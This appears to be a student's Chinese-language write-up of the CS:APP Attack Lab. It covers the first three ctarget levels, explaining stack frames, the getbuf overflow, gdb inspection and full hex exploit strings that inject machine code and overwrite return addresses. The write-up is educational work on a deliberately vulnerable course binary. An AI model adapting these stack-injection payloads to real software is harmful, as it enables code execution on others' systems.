# 3-attacklab

### 1 简要分析

> 实验目的：熟悉栈帧和缓冲区溢出概念
>
> 工作空间：ctarget与rtarget。前三关是ctarget的缓冲区溢出攻击，后两关是rtarget的面向返回的程序设计
>
> 实验内容：想办法用getbuf这个函数造成前三关缓冲区溢出攻击，用程序碎片组装后两关面向返回的程序设计攻击
>
> 构建工具：objdump

### 2 具体实现

**2.1 ctarget-1**

> 先来运行一下，加上-q是不发送到服务器，在本地运行，可以看到确实存在缓冲区溢出漏洞

![csapp3-1](../image/csapp3-1.png)

> 在看看源代码，这个getbuf有意思，可能会缓冲区溢出

```
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

> objdump反汇编一下，康康内部结构，费亿点点耐心，可以看到函数调用关系是main->stable_launch->launch->test->getbuf->......等等，到getbuf时就要想到C语言的gets函数确实会导致缓冲区溢出攻击，我们在这里做点文章。看看getbuf函数

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

> getbuf函数应该就是读入我们输入的字符串的函数了。可以看到，getbuf刚开始时候开辟了16*2+8=40个字节的空间，然后调用Gets函数去读取我们输入的字符，最后返回。
>
> 在这里那么要对栈帧结构熟悉，栈帧规则怪谈：
>
> 1. 栈帧会存储函数调用所需的信息，有函数参数、返回地址、局部变量、寄存器值
> 2. 栈帧一般是向低字节增长，因此开辟了40个字节空间，相当于向下减了40个字节
> 3. 开辟的40个字节中没有存储返回地址，返回地址在调用getbuf的test栈帧中，但紧邻这40个字节
> 4. 康康图（图画的有点抽象）

![csapp3-2](../image/csapp3-2.png)

> 因此，我们读入40个字节的填充物，就可以直接修改返回地址啦。改为touch1的地址，注意是小端序，为c0 17 40

```
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

> 加上填充物为，然后执行一下：./hex2raw < ctarget_1_key.txt | ./ctarget -q，bingo

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```

**2.2 ctarget-2**

> 先看看第二关的代码

```
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

> 可以看到需要让这个val值等于cookie值，这个val是传入的第一个参数，应该存放在%rdi寄存器里面，那我们的目标就是在调用touch2的前把rdi的值修改为cookie的值，然后跳转到touch2就可以了。那么思路就是自己写一段汇编，这段汇编的作用是将cookie压入%rdi，然后用ret调用touch2（记住留两行回车），这个$0x4017ec是touch2的首地址，我就不展示了

```
movq   $0x59b997fa,%rdi
pushq  $0x4017ec
ret


```

> 然后反汇编为机器指令，可以看到，要完成我们上面的指令，机器代码应该是48 c7 ... c3

```

ctarget_2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   

```

> 让getbuf读入我们这一段机器指令，存储在栈帧上，然后我们用第一关的方法让getbuf函数返回到我们读入的那一段机器指令开始处，然后执行我们的代码

![csapp3-3](../image/csapp3-3.png)

> 现在关键就是getbuf返回的那个点怎么找，即我们写入的getbuf开辟到的40个字节的起始位置在哪里，用gdb在getbuf调用的时候下个断点，即

```
4017a8:	48 83 ec 28              sub    $0x28,%rsp
```

> info一下%rsp即可得到rsp            0x5561dc78，那getbuf返回地址写成0x5561dc78就可以了。最后组装核弹

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

**2.3 ctarget-3**

> 先看看源代码

```
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

> 看源码，传入touch3的是一个地址，该地址应该指向一个值等于cookie的字符串，然后由hexmatch中的strncmp比较即可。按照之前的思路，首先使用getbuf的ret跳转到我们将要写入的机器代码开头，然后在我们的机器代码中首先给%rdi赋上存放cookie值的地址，然后使用ret返回到touch3。
>
> 那首先使用man ascii命令查看cookie值的ascii码（cookie是作者给出的值，在cookie.txt文件里面），可以得到cookie的十六进制35 39 62 39 39 37 66 61 00。然后和第二步一样，执行我们注入的机器代码的地址为rsp            0x5561dc78。最后查看touch3的首地址，很容易查到为4018fa。
>
> 就剩下最后一个问题：我们传入的cookie字符串应该存放在哪里。按照常规思维，我们可以存放在注入的代码后面，即如第二关，在48 c7 ... c3之后加上35 39 62 39 39 37 66 61 00，那这个地址我们也可以很轻松的用rsp+13得到，即压入rdi的为rsp+13。
>
> **但有个问题，test函数调用getbuf，getbuf读入字符串，然后返回到我们的注入代码开始执行，但是当我们getbuf返回的那一刻，getbuf的执行了add    $0x28,%rsp，即getbuf开辟的40个字节的空间不受到保护了，在执行完我们的注入的机器代码返回到touch3函数，touch3调用了hexmatch函数，该函数刚开始被调用就开辟了128字节空间，而*s可以是在这128字节空间里的任意位置操作的，很可能破坏原来的40个字节，导致hexmatch在比较字符串之前就破坏了我们传入的字符串，导致比较失败，因此我们要把字符串放在更安全的test栈帧里面，即5561dca8（可以在test下断点找%rsp），因此：**

![csapp3-4](../image/csapp3-4.png)

```
movq   $0x5561dca8,%rdi
pushq  $0x4018fa
ret


```

> 反汇编后为

```

ctarget_3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   

```

> 整体注入为

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

**后面的是用碎片化代码攻击，挺有趣也挺折磨人，毕竟找碎片的话，要不是靠攻略，自己找真的很折磨，作者不是很想写了，有兴趣去搜别人的文章看看呗o(\*￣▽￣\*)ブ**

